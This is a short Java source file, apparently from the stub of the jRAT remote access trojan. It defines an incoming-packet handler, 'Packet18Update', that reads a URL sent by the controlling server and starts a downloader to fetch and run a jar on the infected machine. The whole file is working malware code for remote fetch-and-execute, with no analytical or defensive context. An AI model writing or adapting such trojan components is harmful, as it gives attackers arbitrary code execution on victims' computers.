package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Downloader;

public class Packet18Update extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		boolean fromLocal = Connection.readBoolean();
		new Downloader(url, true, "jar", fromLocal).start();
	}

}
